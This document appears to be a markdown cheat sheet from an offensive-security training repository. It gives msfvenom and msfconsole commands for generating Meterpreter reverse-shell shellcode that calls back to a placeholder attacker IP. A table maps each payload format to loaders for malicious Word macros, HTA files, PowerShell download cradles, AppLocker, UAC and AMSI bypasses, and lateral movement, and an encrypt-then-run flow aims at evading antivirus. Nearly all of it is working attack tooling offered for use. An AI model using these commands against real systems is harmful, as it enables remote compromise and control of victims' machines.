# msfvenom Cheat Sheet — osep-tools

Metasploit payload generation for every loader in this repo. Legend: `<IP>` = attacker IP, `<PORT>` = C2 port.

## 1. Listener (multi/handler)

```bash
# Staged (recommended default for OSEP)
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 8888; set ExitOnSession false; exploit -j"

# Stageless (self-contained ~200KB)
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST <IP>; set LPORT 8888; set ExitOnSession false; exploit -j"
```

## 2. Raw shellcode

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=8888 -f raw -o /tmp/sc.bin        # stageless (~200KB)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=8888 EXITFUNC=thread -f raw -o /tmp/stager.bin   # staged (~500B)
msfvenom -p windows/meterpreter_reverse_tcp    LHOST=<IP> LPORT=8888 -f raw -o /tmp/sc32.bin       # x86 stageless
msfvenom -p windows/meterpreter/reverse_tcp    LHOST=<IP> LPORT=8888 EXITFUNC=thread -f raw -o /tmp/stager32.bin  # x86 staged
```

## 3. Re-format existing raw → array (no re-encode)

```bash
msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f csharp -o /tmp/sc.cs
msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f ps1    -o /tmp/sc.ps1
msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f vba    -o /tmp/sc.vba
```

## 4. Direct array output (no intermediate file)

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=8888 -f csharp
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=8888 -f ps1
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=8888 -f vbapplication
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=8888 -f vba
```

## 5. PowerShell script (ps-loader.ps1 / red.hta / lateral-movement stagers)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=8888 -f psh -o /tmp/payload.ps1
```

## 6. Loader → command mapping

| Loader | Input it expects | Generate with |
|---|---|---|
| `word-macro/caesar-cipher/` | VBA `Array()` (Caesar-encrypted) | raw → `vba-caesar-cipher-encryption.cs` → paste |
| `word-macro/xor-shellcode-runner/` | VBA `Warhead = Array()` (XOR-enc) | raw → `xor-shellcode-encryption-3-byte.cs` → paste |
| `word-macro/alternative-shellcode-runner/` | VBA array (XOR-enc) | same as XOR runner |
| `word-macro/installutil-applocker-bypass/` | .NET InstallUtil exe (downloads `run.txt`) | compile `installutil.cs`; `run.txt` = `-f psh` stager |
| `word-macro/recon/` | n/a (phone-home GET) | n/a |
| `aes-loaders/*` | C# `byte[] buf` (AES-encrypted) | raw → `aes-shellcode-encryption.cs` → paste encrypted buf |
| `amsi-bypass/` | inline PowerShell | n/a |
| `hta-delivery/red.hta` | PS cradle → `payload.ps1` | `-f psh` |
| `hta-delivery/black.hta` | bitsadmin + InstallUtil .NET | compile `installutil.cs` |
| `ps-loaders/ps-loader.ps1` | PS script (`payload.ps1`) | `-f psh` |
| `ps-loaders/ps-shellcode-runner.ps1` | raw `.bin` (DownloadData) **or** inline `ps1` array | `-f raw` or `-f ps1` |
| `uac-bypass/` | inline PS (set elevated payload) | `-f psh` |
| `applocker/msbuild-shellcode.xml` | inline C# task | `-f csharp` array |
| `applocker/regsvr32.sct` | scriptlet (PS) | `-f psh` / regsvr32 |
| `cs-loaders/` (nt/apc/dinvoke/unhook) | raw → C# `byte[] buf` | `-f csharp` or `generic/custom` |
| `lateral-movement/*` | PS stager (`run.ps1`) | `-f psh` |
| `nimsyscallpacker/` | raw shellcode / PE / C# | `-f raw` (stageless) |
| `supersharpshooter/` | raw shellcode → JScript/VBS/HTA/macro (DotNetToJScript) | `-f raw` (stageless) → `SuperSharpShooter.py` |

> ⚠️ **VBA size limit:** stageless meterpreter (`meterpreter_reverse_tcp`) is ~200KB — too big for a single VBA module. For macros use the **staged** `windows/x64/meterpreter/reverse_tcp` stager (~500B) or a download cradle. C#/PS loaders that download at runtime can use either.

## 7. Encrypt-then-run flow (aes-loaders / xor / caesar)

```bash
# 1. Raw shellcode
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=8888 -f raw -o /tmp/sc.bin

# 2. Convert to C# array for the encryptor
msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f csharp -o /tmp/sc.cs

# 3. Paste into the encryptor, compile, run → get encrypted array → paste into the runner
```
